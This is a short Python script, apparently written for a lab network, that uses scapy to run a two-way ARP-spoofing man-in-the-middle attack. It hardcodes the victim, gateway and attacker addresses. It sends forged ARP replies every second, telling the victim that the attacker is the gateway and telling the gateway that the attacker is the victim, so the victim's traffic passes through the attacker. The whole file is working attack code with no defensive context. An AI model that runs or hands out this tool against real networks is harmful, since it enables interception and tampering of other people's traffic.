from scapy.all import ARP, Ether, sendp
import time

# Настройки для атаки
victim_ip = "192.168.99.4"
victim_mac = "08:00:27:41:d9:3a"
gateway_ip = "192.168.99.1"
gateway_mac = "52:54:00:12:35:00"
attacker_mac = "08:00:27:5a:37:3e"

# Формируем пакет для жертвы: говорим ей, что мы - шлюз
pkt_to_victim = Ether(dst=victim_mac) / ARP(
    op=2,
    pdst=victim_ip,
    hwdst=victim_mac,
    psrc=gateway_ip,
    hwsrc=attacker_mac
)

# Формируем пакет для шлюза: говорим ему, что мы - жертва
pkt_to_gateway = Ether(dst=gateway_mac) / ARP(
    op=2,
    pdst=gateway_ip,
    hwdst=gateway_mac,
    psrc=victim_ip,
    hwsrc=attacker_mac
)

print("[+] Двусторонний MitM запущен.")

try:
    while True:
        sendp(pkt_to_victim, verbose=False)
        sendp(pkt_to_gateway, verbose=False)
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[!] Атака остановлена.")